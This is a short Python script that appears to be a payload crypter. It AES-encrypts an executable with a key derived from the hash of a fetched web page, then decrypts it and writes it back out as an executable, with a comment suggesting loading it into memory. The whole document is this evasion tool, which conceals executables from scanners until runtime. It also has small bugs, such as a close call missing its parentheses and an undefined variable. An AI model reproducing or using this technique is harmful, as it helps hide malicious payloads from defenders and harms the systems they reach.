import hashlib
import base64
import urllib2
import binascii
from Crypto.Cipher import AES
from Crypto import Random

def output_b64(exe, url):
	# open file
 	ff = open(exe, 'rb')
 	raw_data = ff.read()
 	ff.close()
 	b64_data = base64.b64encode(raw_data)
 	
 	# get the key and iv
 	response = urllib2.urlopen(url)
 	html = response.read()
 	key = hashlib.sha256(html).digest()
 	iv = "\x00" * 16  # i know, i already know!
 	
 	# pad data
 	length = 16 - (len(b64_data) % 16)
 	b64_data += '{' * length
 	
 	# encrypt
 	e = AES.new(key, AES.MODE_CBC, iv)
 	edata = base64.b64encode(e.encrypt(b64_data))
 	
 	# output to file
 	pdata = "b64_encrypted = \"\"\"" + edata + "\"\"\""
 	ff = open('b64_encrypted_data', 'wb')
 	ff.write(pdata)
 	ff.close
 	print("Finished, used %s as key (hexlify)" % binascii.hexlify(key))

output_b64("cmd.exe", "https://www.google.com")

#########################
# Example of decrypting #
#########################
# Data from file loaded into your script
# b64_encrypted = """YybaqawesJr1KJjobdWxwTkuh+t9WsS=="""

def decrypt(data, url):
 	# Key and iv
 	response = urllib2.urlopen(url)
 	html = response.read()
 	key = hashlib.sha256(html).digest()
 	iv = "\x00" * 16  # i know, i already know!
 	
 	# decrypt struct
 	e = AES.new(key, AES.MODE_CBC, iv)
 	rdata = base64.b64decode(data)
 	ddata = e.decrypt(rdata)
 	
 	# remove padding
 	data = base64.b64decode(ddata.rstrip('{'))
 	return data

orignal_data = decrypt(b64_encrypted, "https://www.google.com")

# Write to file... or load into mem!
ff = open("simple.exe", 'wb')
ff.write(orignal_data)
ff.close()
